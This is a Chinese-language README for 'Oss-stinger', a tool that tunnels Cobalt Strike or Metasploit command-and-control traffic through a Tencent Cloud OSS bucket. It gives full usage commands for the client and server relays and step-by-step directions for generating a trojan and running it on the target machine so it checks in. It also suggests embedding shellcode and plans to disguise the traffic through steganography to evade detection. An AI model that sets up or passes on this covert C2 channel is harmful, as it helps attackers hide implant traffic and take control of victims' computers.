# Oss-stinger
利用腾讯云oss，来转发http流量

可以用来cs/msf上线等

# 如何使用
```
.\oss-stinger.exe
  -address string
        监听地址或者目标地址，格式：127.0.0.1:8080
  -id string
        输入你的腾讯云SecretID
  -key string
        输入你的腾讯云SecretKey
  -mode string
        client/server 二选一
  -url string
        输入你腾讯云OSS桶的url地址
```
首先，现在cs生成一个http的listen，并把host都改成127.0.0.1，然后生成木马
![1.jpg][1]
**然后再把Host改会公网IP(这步很重要)**

然后去腾讯云，申请一个oss桶。拿到URL
![2.jpg][2]
然后再去 `https://console.cloud.tencent.com/cam/capi` 拿到SecretKey和SecretID。

然后就可以使用我们的工具了，先在客户机上起一个转发器，使用命令

```
oss-stinger.exe -mode client -url oss桶的url地址 -address 127.0.0.1:端口 -id 腾讯云SecretID -key 腾讯云SecretKey
```

然后服务器运行
```
oss-stinger.exe -mode server -url oss桶的url地址 -address 127.0.0.1:端口 -id 腾讯云SecretID -key 腾讯云SecretKey
```

然后在客户机双击你的木马，就能上线了
![3.jpg][3]

# tips
如果要弄成一个文件，自行修改代码把shellcode加入进去然后用`go runshellcode()`即可。

secretkey和secretid的安全问题，目前没有什么好的解决方案，可以考虑弄一个动态下发的。自己修改吧

# TODO

 - 修改流量特征（纯Base64太蠢了，预计后续看看能不能弄成一个图片隐写来传输流量）
 - 自定义OSS交换文件（其实这只要改几行代码就行，但是我就是纯纯懒狗一条）
 - 添加阿里云/aws等支持（其实下个sdk调用调用就行了，但是我还是就是懒狗一条）
 - 添加其他协议支持（可能会咕，TCP这种无状态的长连接不太好处理，但是也不是不能处理，让我想想）


  [1]: https://9bie.org/usr/uploads/2022/11/1936167440.jpg
  [2]: https://9bie.org/usr/uploads/2022/11/1255060018.jpg
  [3]: https://9bie.org/usr/uploads/2022/11/2171996492.jpg